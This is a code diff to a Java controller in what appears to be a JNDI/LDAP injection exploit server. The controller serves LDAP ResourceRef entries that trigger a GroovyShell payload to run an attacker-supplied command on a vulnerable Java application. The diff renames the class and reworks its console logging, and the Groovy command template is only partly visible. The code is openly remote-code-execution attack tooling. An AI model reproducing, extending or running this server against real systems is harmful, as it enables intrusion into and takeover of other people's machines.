@@ -9,6 +9,7 @@ import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
 import org.apache.naming.ResourceRef;
+import org.fusesource.jansi.Ansi;
 
 import javax.naming.StringRefAddr;
 
@@ -26,8 +27,8 @@ import static org.fusesource.jansi.Ansi.ansi;
  *      - https://stackoverflow.com/questions/4689240/detecting-the-platform-window-or-linux-by-groovy-grails
  */
 
-@LdapMapping(uri = {"/groovybypass"})
-public class GroovyBypassController implements LdapController {
+@LdapMapping(uri = {"/groovy"})
+public class GroovyController implements LdapController {
     private PayloadType type;
     private String[]    params;
     private String      template = " if (System.properties['os.name'].toLowerCase().contains('windows')) {\n" +
@@ -38,8 +39,6 @@ public class GroovyBypassController implements LdapController {
 
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
-        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Sending LDAP ResourceRef result for |@" + base + " @|MAGENTA with groovy.lang.GroovyShell payload|@"));
-
         Entry e = new Entry(base);
         e.addAttribute("javaClassName", "java.lang.String"); //could be any
 
@@ -56,21 +55,23 @@ public class GroovyBypassController implements LdapController {
 
     @Override
     public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
+        System.out.println("- JNDI LDAP Local Refenrence Links + Groovy");
         try {
             int firstIndex  = base.indexOf("/");
             int secondIndex = base.indexOf("/", firstIndex + 1);
             if (secondIndex < 0) secondIndex = base.length();
 
             String payloadType = base.substring(firstIndex + 1, secondIndex);
+            System.out.println(Ansi.ansi().fgBrightMagenta().a("  Paylaod: " + payloadType).reset());
             if (payloadType.equalsIgnoreCase("command")) {
                 type = PayloadType.valueOf("command");
-                System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Paylaod >> |@" + type));
+                //System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Paylaod >> |@" + type));
             } else {
                 throw new UnSupportedPayloadTypeException("UnSupportedPayloadType >> " + payloadType);
             }
 
             String cmd = Util.getCmdFromBase(base);
-            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Command >> |@" + cmd));
+            System.out.println(Ansi.ansi().fgBrightRed().a("  Command: " + cmd).reset());
             params = new String[]{cmd};
         } catch (Exception e) {
             if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;
